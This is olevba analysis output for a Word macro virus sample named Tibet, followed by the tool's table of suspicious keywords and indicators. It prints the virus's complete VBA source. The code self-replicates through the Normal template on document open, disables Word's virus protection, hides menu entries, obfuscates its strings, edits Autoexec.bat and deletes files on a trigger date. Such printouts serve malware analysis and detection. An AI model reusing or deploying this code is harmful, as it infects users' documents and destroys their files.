olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tibet-34b65fd8375567a3477fc45a23760bfcee6c364a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tibet-34b65fd8375567a3477fc45a23760bfcee6c364a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tibet.bas 
in file: Virus.MSWord.Tibet-34b65fd8375567a3477fc45a23760bfcee6c364a - OLE stream: 'Macros/VBA/Tibet'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

 Infektion

End Sub

Sub DateiÖffnen()

On Error Resume Next

 Dialogs(wdDialogFileOpen).Show

 Infektion

End Sub

Sub DateiNeu()

On Error Resume Next

 Dialogs(wdDialogFileNew).Show

 Infektion

End Sub

Sub AnsichtCode()

On Error Resume Next

 Infektion

 MsgBox "FREE TiBET !", 64, "2BLuM says:"

End Sub

Sub AnsichtVBCode()

On Error Resume Next

 Infektion

 MsgBox "FREE TiBET !", 64, "2BLuM says:"

End Sub

Sub DateiDokVorlagen()

On Error Resume Next

 Infektion

 MsgBox "FREE TiBET !", 64, "2BLuM says:"

End Sub

Sub FormatFormatvorlage()

On Error Resume Next

 Infektion

 MsgBox "FREE TiBET !", 64, "2BLuM says:"

End Sub

Sub ExtrasMakro()

On Error Resume Next

 Infektion

 MsgBox "FREE TiBET !", 64, "2BLuM says:"

End Sub

Sub NormAttrib()

NA$ = GetAttr(NormalTemplate.FullName)

If NA$ = vbReadOnly Or NA$ = vbArchive & vbReadOnly Then

    Open "c:\Autoexec.bat" For Append As #1

     Print #1, "if exist c:\normattr.bat call c:\normattr.bat"

     Print #1, "if exist c:\normattr.bat erase c:\normattr.bat"

    Close 1

    Open "C:\normattr.bat" For Output Access Write As #2

    Print #2, "@echo off"

    Print #2, "if exist c:\progra~1\micros~1\vorlagen\normal.dot goto micro1"

    Print #2, "if exist c:\progra~1\micros~1\vorlagen\normal.dot goto micro1"

    Print #2, "if exist c:\progra~1\micros~2\vorlagen\normal.dot goto micro2"

    Print #2, "if exist c:\progra~1\micros~3\vorlagen\normal.dot goto micro3"

    Print #2, "if exist c:\progra~1\micros~4\vorlagen\normal.dot goto micro4"

    Print #2, "if exist c:\progra~1\micros~5\vorlagen\normal.dot goto micro5"

    Print #2, "if exist c:\progra~1\micros~6\vorlagen\normal.dot goto micro6"

    Print #2, "GoTo ende"

    Print #2, ":micro1"

    Print #2, "attrib -h -r -a c:\progra~1\micros~1\vorlagen\normal.dot > nul"

    Print #2, "attrib -h -r -a c:\progra~1\micros~1\office\normal.dot > nul"

    Print #2, "GoTo ende"

    Print #2, ":micro2"

    Print #2, "attrib -h -r -a c:\progra~1\micros~2\vorlagen\normal.dot > nul"

    Print #2, "attrib -h -r -a c:\progra~1\micros~2\office\normal.dot > nul"

    Print #2, "GoTo ende"

    Print #2, ":micro3"

    Print #2, "attrib -h -r -a c:\progra~1\micros~3\vorlagen\normal.dot > nul"

    Print #2, "attrib -h -r -a c:\progra~1\micros~3\office\normal.dot > nul"

    Print #2, "GoTo ende"

    Print #2, ":micro4"

    Print #2, "attrib -h -r -a c:\progra~1\micros~4\vorlagen\normal.dot > nul"

    Print #2, "attrib -h -r -a c:\progra~1\micros~4\office\normal.dot > nul"

    Print #2, "GoTo ende"

    Print #2, ":micro5"

    Print #2, "attrib -h -r -a c:\progra~1\micros~5\vorlagen\normal.dot > nul"

    Print #2, "attrib -h -r -a c:\progra~1\micros~5\office\normal.dot > nul"

    Print #2, "GoTo ende"

    Print #2, ":micro6"

    Print #2, "attrib -h -r -a c:\progra~1\micros~6\vorlagen\normal.dot > nul"

    Print #2, "attrib -h -r -a c:\progra~1\micros~6\office\normal.dot > nul"

    Print #2, ":ende"

    Close 2

End If

End Sub

Sub Tibet()

On Error Resume Next

Assistant.Visible = True

With Assistant.NewBalloon

    .BalloonType = msoBalloonTypeBullets

    .Icon = msoIconAlert

    .Heading = Chr(87) + Chr(77) + Chr(57) + Chr(55) + Chr(46) + Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116)

    .Text = Chr(50) + Chr(66) + Chr(76) + Chr(117) + Chr(77) + Chr(32) + Chr(115) + Chr(97) + Chr(121) + Chr(115) + Chr(58) + Chr(32) + Chr(34) + Chr(70) + Chr(82) + Chr(69) + Chr(69) + Chr(32) + Chr(84) + Chr(105) + Chr(66) + Chr(69) + Chr(84) + Chr(32) + Chr(33) + Chr(34)

    .Show

End With

Assistant.Visible = False

If Day(Now()) = 30 And Month(Now()) = 4 Then Kill "*.*"

End Sub

Sub Infektion()

On Error Resume Next

ExZ$ = Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(83) + Chr(121) + Chr(115) + Chr(116) + Chr(101) + Chr(109) + Chr(92) + Chr(70) + Chr(116) + Chr(51) + Chr(49) + Chr(119) + Chr(109) + Chr(122) + Chr(46) + Chr(118) + Chr(120) + Chr(100)

NI = False

AI = False

    Call NormAttrib

    Call Stealth

    Call FTNK

With Application

    .EnableCancelKey = wdCancelDisabled

    .DisplayAlerts = wdAlertsNone

    .UserName = Chr(68) + Chr(97) + Chr(108) + Chr(101) + Chr(105) + Chr(32) + Chr(76) + Chr(97) + Chr(109) + Chr(97)

    .UserInitials = Chr(50) + Chr(66) + Chr(76) + Chr(117) + Chr(77)

    .UserAddress = Chr(68) + Chr(111) + Chr(32) + Chr(115) + Chr(111) + Chr(109) + Chr(101) + Chr(116) + Chr(104) + Chr(105) + Chr(110) + Chr(103) + Chr(44) + Chr(32) + Chr(106) + Chr(111) + Chr(105) + Chr(110) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(77) + Chr(105) + Chr(108) + Chr(97) + Chr(114) + Chr(101) + Chr(112) + Chr(97) + Chr(32) + Chr(102) + Chr(117) + Chr(110) + Chr(100) + Chr(33) + Chr(13) + Chr(13) + Chr(50) + Chr(66) + Chr(76) + Chr(117) + Chr(77) + Chr(32) + Chr(99) + Chr(111) + Chr(110) + Chr(116) + Chr(97) + Chr(99) + Chr(116) + Chr(58) + Chr(32) + Chr(32) + Chr(122) + Chr(119) + Chr(101) + Chr(105) + Chr(98) + Chr(108) + Chr(117) + Chr(109) + Chr(95) + Chr(108) + Chr(122) + Chr(111) + Chr(64) + Chr(121) + Chr(97) + Chr(104) + Chr(111) + Chr(111) + Chr(46) + Chr(100) + Chr(101)

End With

WordBasic.DisableAutoMacros 0

With Options

    .SaveNormalPrompt = False

    .VirusProtection = False

    .ConfirmConversions = False

End With

ActiveDocument.ReadOnlyRecommended = False

    ActiveDocument.VBProject.VBComponents(Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116)).Export ExZ$

    NormalTemplate.VBProject.VBComponents(Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116)).Export ExZ$

With Dialogs(wdDialogFileSummaryInfo)

    .Author = Chr(50) + Chr(66) + Chr(76) + Chr(117) + Chr(77) + Chr(32) + Chr(60) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(62)

    .Title = Chr(87) + Chr(77) + Chr(57) + Chr(55) + Chr(46) + Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116)

    .Comments = Chr(70) + Chr(82) + Chr(69) + Chr(69) + Chr(32) + Chr(84) + Chr(105) + Chr(66) + Chr(69) + Chr(84) + Chr(32) + Chr(65) + Chr(78) + Chr(68) + Chr(32) + Chr(65) + Chr(80) + Chr(80) + Chr(82) + Chr(69) + Chr(67) + Chr(73) + Chr(65) + Chr(84) + Chr(69) + Chr(32) + Chr(84) + Chr(72) + Chr(69) + Chr(32) + Chr(75) + Chr(78) + Chr(79) + Chr(87) + Chr(76) + Chr(69) + Chr(68) + Chr(71) + Chr(69) + Chr(32) + Chr(79) + Chr(70) + Chr(32) + Chr(84) + Chr(72) + Chr(69) + Chr(32) + Chr(84) + Chr(105) + Chr(66) + Chr(69) + Chr(84) + Chr(65) + Chr(78) + Chr(32) + Chr(67) + Chr(85) + Chr(76) + Chr(84) + Chr(85) + Chr(82) + Chr(69)

    .Execute

End With

For a = 1 To NormalTemplate.VBProject.VBComponents.Count

    If NormalTemplate.VBProject.VBComponents(a).Name = Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116) Then NI = True

Next a

For b = 1 To ActiveDocument.VBProject.VBComponents.Count

    If ActiveDocument.VBProject.VBComponents(b).Name = Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116) Then AI = True

Next b

If NI = True And AI = True Then GoTo Ende_

If NI = True And AI = False Then Set Installation = ActiveDocument.VBProject

If NI = False And AI = True Then Set Installation = NormalTemplate.VBProject

Installation.VBComponents.Import ExZ$

If NormalTemplate.Saved = False Then NormalTemplate.Save

If ActiveDocument.Saved = False Then ActiveDocument.SaveAs (ActiveDocument.FullName), Fileformat:=wdFormatDocument

Ende_:

Application.DisplayAlerts = wdAlertsAll

If Second(Now()) >= 30 Then Call Tibet

End Sub

Sub Stealth()

On Error Resume Next

    Application.CommandBars("View").Controls(6).Delete

    Application.CommandBars("Format").Controls(12).Delete

    Application.CommandBars("Tools").Controls(12).Delete

    Application.CommandBars("Tools").Controls(13).Delete

End Sub

Sub DateiDruckenStandard()

On Error Resume Next

    Application.ScreenUpdating = False

    WordBasic.EndOfDocument

    Selection.TypeParagraph

    Selection.TypeParagraph

    Selection.TypeText Text:=Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(105) + Chr(110) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(101) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(180) + Chr(100) + Chr(32) + Chr(108) + Chr(105) + Chr(107) + Chr(101) + Chr(32) + Chr(116) + Chr(111) + Chr(32) + Chr(115) + Chr(97) + Chr(121) + Chr(58)

    Selection.TypeParagraph

    Selection.TypeText Text:=Chr(70) + Chr(82) + Chr(69) + Chr(69) + Chr(32) + Chr(84) + Chr(105) + Chr(66) + Chr(69) + Chr(84) + Chr(32) + Chr(65) + Chr(78) + Chr(68) + Chr(32) + Chr(65) + Chr(80) + Chr(80) + Chr(82) + Chr(69) + Chr(67) + Chr(73) + Chr(65) + Chr(84) + Chr(69) + Chr(32) + Chr(84) + Chr(72) + Chr(69) + Chr(32) + Chr(75) + Chr(78) + Chr(79) + Chr(87) + Chr(76) + Chr(69) + Chr(68) + Chr(71) + Chr(69) + Chr(32) + Chr(79) + Chr(70) + Chr(32) + Chr(84) + Chr(72) + Chr(69) + Chr(32) + Chr(84) + Chr(105) + Chr(66) + Chr(69) + Chr(84) + Chr(65) + Chr(78) + Chr(32) + Chr(67) + Chr(85) + Chr(76) + Chr(84) + Chr(85) + Chr(82) + Chr(69) + Chr(32) + Chr(33)

    Application.PrintOut

    Selection.MoveLeft Unit:=wdCharacter, Count:=66, Extend:=wdExtend

    Selection.MoveUp Unit:=wdLine, Count:=1, Extend:=wdExtend

    Selection.Delete

    WordBasic.StartOfDocument

    Application.ScreenUpdating = True

    If Second(Now()) >= 30 Then Call Tibet

End Sub

Sub DateiDrucken()

On Error Resume Next

    Application.ScreenUpdating = False

    WordBasic.EndOfDocument

    Selection.TypeParagraph

    Selection.TypeParagraph

    Selection.TypeText Text:=Chr(65) + Chr(110) + Chr(100) + Chr(32) + Chr(105) + Chr(110) + Chr(32) + Chr(116) + Chr(104) + Chr(101) + Chr(32) + Chr(101) + Chr(110) + Chr(100) + Chr(32) + Chr(73) + Chr(180) + Chr(100) + Chr(32) + Chr(108) + Chr(105) + Chr(107) + Chr(101) + Chr(32) + Chr(116) + Chr(111) + Chr(32) + Chr(115) + Chr(97) + Chr(121) + Chr(58)

    Selection.TypeParagraph

    Selection.TypeText Text:=Chr(70) + Chr(82) + Chr(69) + Chr(69) + Chr(32) + Chr(84) + Chr(105) + Chr(66) + Chr(69) + Chr(84) + Chr(32) + Chr(65) + Chr(78) + Chr(68) + Chr(32) + Chr(65) + Chr(80) + Chr(80) + Chr(82) + Chr(69) + Chr(67) + Chr(73) + Chr(65) + Chr(84) + Chr(69) + Chr(32) + Chr(84) + Chr(72) + Chr(69) + Chr(32) + Chr(75) + Chr(78) + Chr(79) + Chr(87) + Chr(76) + Chr(69) + Chr(68) + Chr(71) + Chr(69) + Chr(32) + Chr(79) + Chr(70) + Chr(32) + Chr(84) + Chr(72) + Chr(69) + Chr(32) + Chr(84) + Chr(105) + Chr(66) + Chr(69) + Chr(84) + Chr(65) + Chr(78) + Chr(32) + Chr(67) + Chr(85) + Chr(76) + Chr(84) + Chr(85) + Chr(82) + Chr(69) + Chr(32) + Chr(33)

    Dialogs(wdDialogFilePrint).Show

    Selection.MoveLeft Unit:=wdCharacter, Count:=66, Extend:=wdExtend

    Selection.MoveUp Unit:=wdLine, Count:=1, Extend:=wdExtend

    Selection.Delete

    WordBasic.StartOfDocument

    Application.ScreenUpdating = True

    If Second(Now()) >= 30 Then Call Tibet

End Sub

Function FTNK()

Randomize

' Thanks VicodinES

var1$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))

var2$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))

var3$ = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22)))

z1 = Int((Rnd * 1000) + 7891)

z2 = Int((Rnd * 1000) + 9871)

z3 = Int((Rnd * 1000) + 8791)

Kern = Application.VBE.ActiveVBProject.VBComponents(Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116)).CodeModule.CountOfLines

With Application.VBE.ActiveVBProject.VBComponents(Chr(84) + Chr(105) + Chr(98) + Chr(101) + Chr(116)).CodeModule

For x = 2 To Kern Step 2

.ReplaceLine x, "' " & var2$ & var1$ & z3 & var2$ & z1 & var3$ & z2 & z2 & Now & var2$ & var3$ & z3 & var1$ & Now & var3$ & z1 & var2$ & z2 & var1$ & z3 & ActivePrinter & Now & var3$ & z3 & var1$ & z1 & " " & Time$() & " " & var1$ & var3$ & z2 & Date$ & z3 & var2$ & z1 & Activeuser & var2$ & z3 & z1 & z2 & var1$ & var3$ & ActivePrinter & var3$ & var2$ & var1$ & z2 & var3$ & z1 & z2 & z3 & var1$ & var2$ & var3$ & z2 & z2 & z1 & var3$ & var1$ & z3

Next x

End With

End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |normattr.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

